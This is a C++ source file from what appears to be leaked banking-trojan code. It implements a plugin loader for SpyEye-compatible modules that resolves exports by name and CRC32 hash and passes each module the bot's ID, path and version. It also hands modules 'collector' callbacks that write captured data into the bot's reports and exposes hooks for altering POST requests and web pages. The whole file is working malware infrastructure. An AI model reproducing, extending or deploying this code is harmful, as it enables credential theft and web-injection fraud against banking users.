#include <windows.h>
#include <shlobj.h>
#include <intrin.h>

#include "defines.h"
#include "DllCore.h"
#include "report.h"
#include "spyeye_modules.h"

#include "..\common\str.h"
#include "..\common\mem.h"
#include "..\common\debug.h"

CRITICAL_SECTION cs;
SpyEye_Modules::LOADED_MODULE_LIST Loaded_Module_List = {0};

static PIMAGE_NT_HEADERS PeImageNtHeader(PVOID ImageBase)
{
	PIMAGE_DOS_HEADER ImageDosHeaders = (PIMAGE_DOS_HEADER)ImageBase;
	PIMAGE_NT_HEADERS ImageNtHeaders = NULL;

	if (ImageDosHeaders->e_magic == IMAGE_DOS_SIGNATURE)
	{
		ImageNtHeaders = MAKE_PTR(ImageBase, ImageDosHeaders->e_lfanew, PIMAGE_NT_HEADERS);
		if (ImageNtHeaders->Signature == IMAGE_NT_SIGNATURE)
		{
			return ImageNtHeaders;
		}
	}

	return NULL;
}

static PVOID PeImageDirectoryEntryToData(PVOID ImageBase, BOOLEAN ImageLoaded, ULONG Directory, PULONG Size, BOOLEAN RVA = FALSE)
{
	PIMAGE_NT_HEADERS32 pPE32;
	PIMAGE_NT_HEADERS64 pPE64;
	DWORD Va = 0;

	pPE32 = (PIMAGE_NT_HEADERS32)PeImageNtHeader(ImageBase);
	if (pPE32)
	{
		if (pPE32->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
		{
			if (pPE32->OptionalHeader.DataDirectory[Directory].VirtualAddress)
			{
				if (Directory >= pPE32->OptionalHeader.NumberOfRvaAndSizes) return NULL;

				Va = pPE32->OptionalHeader.DataDirectory[Directory].VirtualAddress;
				if (Va == NULL) return NULL;

				if (Size) *Size = pPE32->OptionalHeader.DataDirectory[Directory].Size;

				if (ImageLoaded) return RtlOffsetToPointer(ImageBase, Va);
			}
		}
		else if (pPE32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
		{
			pPE64 = (PIMAGE_NT_HEADERS64)pPE32;
			if (pPE64->OptionalHeader.DataDirectory[Directory].VirtualAddress)
			{
				if (Directory >= pPE64->OptionalHeader.NumberOfRvaAndSizes) return NULL;

				Va = pPE64->OptionalHeader.DataDirectory[Directory].VirtualAddress;
				if (Va == NULL) return NULL;

				if (Size) *Size = pPE64->OptionalHeader.DataDirectory[Directory].Size;

				if (ImageLoaded) return RVA ? (PVOID)Va : RtlOffsetToPointer(ImageBase, Va);
			}
		}
	}

	if (Va)
	{
		PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(pPE32);
		DWORD Count = pPE32->FileHeader.NumberOfSections;

		while (Count--)
		{
			if (Section->VirtualAddress == Va) return RtlOffsetToPointer(ImageBase, Section->PointerToRawData);

			Section++;
		}
	}

	return NULL;
}

static PVOID PeGetProcAddress(PVOID ModuleBase, PCHAR lpProcName, BOOLEAN RVA = FALSE)
{
	PIMAGE_EXPORT_DIRECTORY pImageExport;
	DWORD dwExportSize;

	if (pImageExport = (PIMAGE_EXPORT_DIRECTORY)PeImageDirectoryEntryToData(ModuleBase, TRUE, IMAGE_DIRECTORY_ENTRY_EXPORT, &dwExportSize))
	{
		PDWORD pAddrOfNames = MAKE_PTR(ModuleBase, pImageExport->AddressOfNames, PDWORD);
		for (DWORD i = 0; i < pImageExport->NumberOfNames; i++)
		{
			if (!Str::_CompareA(RtlOffsetToPointer(ModuleBase, pAddrOfNames[i]), lpProcName, -1, -1))
			{
				PDWORD pAddrOfFunctions = MAKE_PTR(ModuleBase, pImageExport->AddressOfFunctions, PDWORD);
				PWORD pAddrOfOrdinals = MAKE_PTR(ModuleBase, pImageExport->AddressOfNameOrdinals, PWORD);

				return RVA ? (PVOID)pAddrOfFunctions[pAddrOfOrdinals[i]] : (PVOID)RtlOffsetToPointer(ModuleBase, pAddrOfFunctions[pAddrOfOrdinals[i]]);
			}
		}
	}

	return NULL;
}

static PVOID PeGetProcAddressByCrc32(PVOID ModuleBase, DWORD ProcCrc32)
{
	PIMAGE_EXPORT_DIRECTORY pImageExport;
	DWORD dwExportSize;

	if (pImageExport = (PIMAGE_EXPORT_DIRECTORY)PeImageDirectoryEntryToData(ModuleBase, TRUE, IMAGE_DIRECTORY_ENTRY_EXPORT, &dwExportSize))
	{
		PDWORD pAddrOfNames = MAKE_PTR(ModuleBase, pImageExport->AddressOfNames, PDWORD);
		for (DWORD i = 0; i < pImageExport->NumberOfNames; i++)
		{
			if (/*!Str::_CompareA(RtlOffsetToPointer(ModuleBase, pAddrOfNames[i]), lpProcName, -1, -1)*/ Crypt::crc32Hash(RtlOffsetToPointer(ModuleBase, pAddrOfNames[i]), Str::_LengthA(RtlOffsetToPointer(ModuleBase, pAddrOfNames[i]))) == ProcCrc32)
			{
				PDWORD pAddrOfFunctions = MAKE_PTR(ModuleBase, pImageExport->AddressOfFunctions, PDWORD);
				PWORD pAddrOfOrdinals = MAKE_PTR(ModuleBase, pImageExport->AddressOfNameOrdinals, PWORD);

				return (PVOID)RtlOffsetToPointer(ModuleBase, pAddrOfFunctions[pAddrOfOrdinals[i]]);
			}
		}
	}

	return NULL;
}

static DWORD WINAPI SeparateThreadWorker(void* p)
{
	SpyEye_Modules::PWORKER_ITEM item = (SpyEye_Modules::PWORKER_ITEM)p;
	switch(item->function_switcher)
	{
	case SpyEye_Modules::SM_FUNC_INIT:
		{
			WDEBUG0(WDDT_INFO, "Init function called.");
			((INIT)item->function_ptr)((LPSTR)item->arg1);
			break;
		}
	case SpyEye_Modules::SM_FUNC_START:
		{
			WDEBUG0(WDDT_INFO, "Start function called.");
			((START)item->function_ptr)();
			break;
		}
	case SpyEye_Modules::SM_FUNC_STOP:
		{
			WDEBUG0(WDDT_INFO, "Stop function called.");
			((STOP)item->function_ptr)();
			break;
		}
	case SpyEye_Modules::SM_FUNC_RUN:
		{
			WDEBUG0(WDDT_INFO, "Run called.");
			((RUN)item->function_ptr)((LPVOID*)item->arg1, item->count);
			Mem::freeArrayOfPointers(item->arg1, item->count);
			break;
		}
	
	}
	Mem::free(item->arg1);
	Mem::free(p);
	return 0;
}


void SpyEye_Modules::init()
{
	InitializeCriticalSection(&cs);
	Loaded_Module_List.first = NULL;
	Loaded_Module_List.last = NULL;
	
}

void SpyEye_Modules::uninit()
{

}

SpyEye_Modules::PLOADED_MODULE SpyEye_Modules::InsertModule(void* image_base, LPSTR module_name)
{
	PLOADED_MODULE mod = (PLOADED_MODULE)Mem::alloc(sizeof(LOADED_MODULE));
	if(mod)
	{
		mod->exported_functions.ChangePostRequest = (CALLBACK_CHANGEPOSTREQUEST)PeGetProcAddress(image_base, "Callback_ChangePostRequest");
		mod->exported_functions.OnAfterLoadingPage = (CALLBACK_ONAFTERLOADINGPAGE)PeGetProcAddress(image_base, "Callback_OnAfterLoadingPage");
		mod->exported_functions.OnBeforeLoadPage3 = (CALLBACK_ONBEFORELOADPAGE3)PeGetProcAddress(image_base, "Callback_OnBeforeLoadPage3");
		mod->exported_functions.OnBeforeProcessUrl = (CALLBACK_ONBEFOREPROCESSURL)PeGetProcAddress(image_base, "Callback_OnBeforeProcessUrl");

		mod->keep_alive = false;
		{
			KEEPALIVE keepalive = (KEEPALIVE)PeGetProcAddress(image_base, "KeepAlive");
			if(keepalive) mod->keep_alive = keepalive();
		}
		mod->module_base = image_base;
		mod->module_name = Str::_CopyExA(module_name, -1);
		mod->module_crc32 = Crypt::crc32Hash(mod->module_name, Str::_LengthA(mod->module_name));
#if BO_DEBUG > 0
		LPWSTR moduleNameW = Str::_ansiToUnicodeEx(mod->module_name, -1);
		WDEBUG2(WDDT_INFO, "Module name: %s\r\n Module Crc32: 0x%X.", moduleNameW, mod->module_crc32);
		Mem::free(moduleNameW);
#endif
		//Reserved.
		mod->reserved = 0;
	}
	else
		return 0;

	_ReadWriteBarrier();
	EnterCriticalSection(&cs);
	if(Loaded_Module_List.first == NULL)
	{
		//Module initialization.
		mod->next = NULL;
		mod->prev = NULL;
		Loaded_Module_List.first = mod;
		Loaded_Module_List.last = mod;
	}
	else
	{
		//Module.
		mod->prev = Loaded_Module_List.last;
		mod->next = NULL;
		Loaded_Module_List.last->next = mod;
		Loaded_Module_List.last = mod;
	}
	LeaveCriticalSection(&cs);
	_ReadWriteBarrier();

	return mod;
}

DWORD __cdecl SpyEye_Modules::ImageLoadNotifyRoutine(void* image_base, LPSTR module_name, LPSTR params)
{
	if(!image_base || !module_name) return SM_INVALID_ARGUMENTS;

	PLOADED_MODULE Mod = InsertModule(image_base, module_name);

	if(!Mod) return SM_ERROR;

	DWORD result = SM_VALID_MODULE;
	//TakeGateToCollectors.
	{
		TAKEGATETOCOLLECTOR takegatetocollector = (TAKEGATETOCOLLECTOR)PeGetProcAddress(image_base, "TakeGateToCollector");
		if(takegatetocollector) takegatetocollector(GateToCollector);
		TAKEGATETOCOLLECTOR2 takegatetocollector2 = (TAKEGATETOCOLLECTOR2)PeGetProcAddress(image_base, "TakeGateToCollector2");
		if(takegatetocollector2) takegatetocollector2(GateToCollector2);
	}
	//TakeBot*.
	{
		TAKEBOTGUID takebotguid = (TAKEBOTGUID)PeGetProcAddress(image_base, "TakeBotGuid");
		if(takebotguid) 
		{
			LPSTR botGuid = Str::_unicodeToAnsiEx(coreDllData.compId, -1);
			takebotguid(botGuid);
			Mem::free(botGuid);
		}
		//Really? Crypted dll path or process where we are now? :)
		TAKEBOTPATH takebotpath = (TAKEBOTPATH)PeGetProcAddress(image_base, "TakeBotPath");
		if(takebotpath)
		{
			LPSTR path = Str::_unicodeToAnsiEx(coreDllData.currentProcessPath, -1);
			takebotpath(path);
			Mem::free(path);
		}
		TAKEBOTVERSION takebotversion = (TAKEBOTVERSION)PeGetProcAddress(image_base, "TakeBotVersion");
		if(takebotversion)
		{
			takebotversion(BOT_VERSION);
		}
	}
	
	//Init. (Separate Thread)
	{
		PWORKER_ITEM item = (PWORKER_ITEM)Mem::alloc(sizeof(WORKER_ITEM));
		if(item)
		{
			item->function_ptr = PeGetProcAddress(image_base, "Init");
			if(!item->function_ptr) {item->function_ptr = PeGetProcAddress(image_base, "SpyEye_Init");}
			if(item->function_ptr)
			{
				
				item->function_switcher = SM_FUNC_INIT;
				item->arg1 = Str::_CopyExA(params, -1);
				HANDLE thr = CreateThread(0, 0, SeparateThreadWorker, item, 0, 0);
				if(thr) CloseHandle(thr);
				else {Mem::free(item); result = SM_ERROR;}
			}
			else
			{
				Mem::free(item);
				result = SM_INVALID_MODULE;
			}
		}
	}

	//Our modules compatibility.
	{
		TAKEGATETOCOLLECTOR3 takegatetocollector3 = (TAKEGATETOCOLLECTOR3)PeGetProcAddress(image_base, "TakeGateToCollector3");
		if(takegatetocollector3) {takegatetocollector3(SpyEye_Modules::GateToCollector3); WDEBUG0(WDDT_INFO, "TakeGateToCollector3 address has taken.");}
		TAKEWRITEDATA takewritedata = (TAKEWRITEDATA)PeGetProcAddress(image_base, "TakeWriteData");
		if(takewritedata) {takewritedata(SpyEye_Modules::WriteData); WDEBUG0(WDDT_INFO, "WriteData has taken.");}
#if BO_DEBUG > 0
		TAKEDEBUGGATE TakeDebugGate = (TAKEDEBUGGATE)PeGetProcAddress(image_base, "TakeDebugGate");
		if(TakeDebugGate) {TakeDebugGate(DebugClient::WriteString); WDEBUG0(WDDT_INFO, "Debug gate has taken.");}
#endif
	}
	
	
		PWORKER_ITEM item = (PWORKER_ITEM)Mem::alloc(sizeof(WORKER_ITEM));
		if(item)
		{
			item->function_ptr = PeGetProcAddress(image_base, "Start");
			if(!item->function_ptr) {item->function_ptr = PeGetProcAddress(image_base, "SpyEye_Start");}
			if(item->function_ptr)
			{
				Mod->exported_functions.Start = (START)item->function_ptr;
				item->function_switcher = SM_FUNC_START;
				item->arg1 = 0;
				HANDLE thr = CreateThread(0, 0, SeparateThreadWorker, item, 0, 0);
				if(thr) CloseHandle(thr);
				else {Mem::free(item); result = SM_ERROR;}
			}
			else
			{
				Mem::free(item);
				result = SM_INVALID_MODULE;
			}
		}
	

	return result;
}

DWORD __cdecl SpyEye_Modules::ImageUnloadNotifyRoutine(void* image_base, LPSTR module_name)
{
	if(!image_base || !module_name) return MODULE_INVALID_ARGUMENTS;
	if(coreDllData.modules.currentModule == image_base)
	{
		bool CanWeUnload = true;
		WDEBUG0(WDDT_INFO, "Trying to unload modules.");
		PLOADED_MODULE cur = Loaded_Module_List.first;
		while(cur)
		{
			if(cur->keep_alive == true) 
			{
				CanWeUnload = false;
				WDEBUG1(WDDT_INFO, "We can't unload because module '%s' is persistent.", cur->module_name);
				break;
			}
			cur = cur->next;
		}
		if(CanWeUnload)
		{
			WDEBUG0(WDDT_INFO, "All is ok, unloading modules.");
			while(cur)
			{
				if(!cur->exported_functions.Stop()) {WDEBUG1(WDDT_INFO, "Module %s won't stop. Exiting.", cur->module_name); CanWeUnload = false; break;}
				else {WDEBUG1(WDDT_INFO, "Module %s successfuly stopped.", cur->module_name);}
				cur = cur->next;
			}
		}
		if(CanWeUnload)
		{
			DllCore::uninit();
			return MODULE_NOT_PERSISTENT;
		}
		else
		{
			WDEBUG0(WDDT_INFO, "Can't unload, at least 1 module is persistent.");
			return MODULE_IS_PERSISTENT;
		}
	}
	else
	{
		bool ok = false;
		PLOADED_MODULE Mod = Loaded_Module_List.first;
		while(Mod)
		{
			if(!Str::_CompareA(module_name, Mod->module_name, -1, -1) && Mod->module_base == image_base)
			{
				WDEBUG0(WDDT_INFO, "Founded module for unload.");
				ok = true;
				break;
			}
			Mod = Mod->next;
		}
		if(ok)
		{
			if(Mod->keep_alive || !Mod->exported_functions.Stop())
			{
				WDEBUG0(WDDT_INFO, "Module is persistent");
				return MODULE_IS_PERSISTENT;
			}
			else
			{
				WDEBUG0(WDDT_INFO, "Module unloaded.");
				return MODULE_NOT_PERSISTENT;
			}
		}
	}
	return MODULE_NOT_FOUND;
}

BOOL __cdecl SpyEye_Modules::GateToCollector3(DWORD type, LPWSTR sourcePath, LPWSTR string, DWORD stringSize)
{
	return Report::writeString(type == NULL ? BLT_MODULE_REPORT : type, sourcePath, string, stringSize);
}

BOOL __cdecl SpyEye_Modules::WriteData(DWORD type, LPWSTR sourcePath, void *data, DWORD dataSize)
{
	return Report::writeData(type, sourcePath, data, dataSize);
}

void __cdecl SpyEye_Modules::GateToCollector(IN PBYTE data, IN DWORD size)
{
	/*[Null-Terminated-String:NameOfTable]
	[DWORD:CountOfFields]
	--- field1 ---
	[Null-Terminated-String:NameOfField]
	[DWORD:SizeOfField]
	[BYTE-Array:FiledData]
	---
	--- field2 ---
	...
	---*/
	if(data == NULL || size == NULL) {WDEBUG0(WDDT_ERROR, "data or size is NULL.");return;}
	LPBYTE cur = data;
	LPSTR string = NULL;
	DWORD stringSize = 0;
	DWORD countOfFields = 0;
	LPSTR title = (LPSTR)cur;
	DWORD titleSize = Str::_LengthA(title);
	cur += titleSize + 1;
	if(titleSize == NULL) {WDEBUG0(WDDT_ERROR, "Title size is NULL.");return;}
	countOfFields = *(LPDWORD)(cur);
	cur += sizeof(DWORD);
	if(countOfFields == NULL) {WDEBUG0(WDDT_ERROR, "countOfFields is NULL.");return;}
	WDEBUG2(WDDT_ERROR, "Starting to parse data. title=%s, count=%u", title, countOfFields);
	for(DWORD i = 0; i < countOfFields; i++)
	{
		char buf[1024];
		LPSTR fName = (LPSTR)cur;
		DWORD fNameSize = Str::_LengthA((LPSTR)cur);
		cur += fNameSize + 1;

		DWORD fSize = *(LPDWORD)(cur);
		cur += sizeof(DWORD);

		Str::_CopyA(buf, (LPSTR)cur, fSize);
		stringSize = Str::_sprintfExA(&string, "%s: %s\r\n\r\n", fName, buf);

	}

	LPWSTR stringW = Str::_ansiToUnicodeEx(string, -1);
	if(!stringW) {WDEBUG0(WDDT_ERROR, "Can't allocate for stringW."); return;}
	if(Report::writeString(BLT_MODULE_REPORT, 0, stringW, stringSize)) WDEBUG1(WDDT_ERROR, "Successfuly written report. \r\n%s", stringW);
	else {WDEBUG1(WDDT_ERROR, "Can't send this report. \r\n%s", stringW);}

	Mem::free(stringW);
	Mem::free(string);
}

void __cdecl SpyEye_Modules::GateToCollector2(IN PBYTE pbData, IN DWORD dwSize)
{
	WDEBUG0(WDDT_INFO, "GateToCollector2 called. Redirecting to GateToCollector.");
	GateToCollector(pbData, dwSize);
}

DWORD SpyEye_Modules::WebMainCallback(DWORD switcher, LPSTR Url, LPSTR Verb, LPSTR Headers, LPSTR PostVars, LPSTR* lpContent, LPDWORD dwContentSize)
{
	DWORD Result = 0;
	
	switch(switcher)
	{
	case SM_FUNC_BEFOREPROCESSURL:
		{
			
			break;
		}
	case SM_FUNC_BEFORELOADPAGE:
		{

			break;
		}
	case SM_FUNC_AFTERLOADINGPAGE:
		{

			break;
		}
	case SM_FUNC_CHANGEPOSTREQUEST:
		{

			break;
		}
	}
	return Result;
}
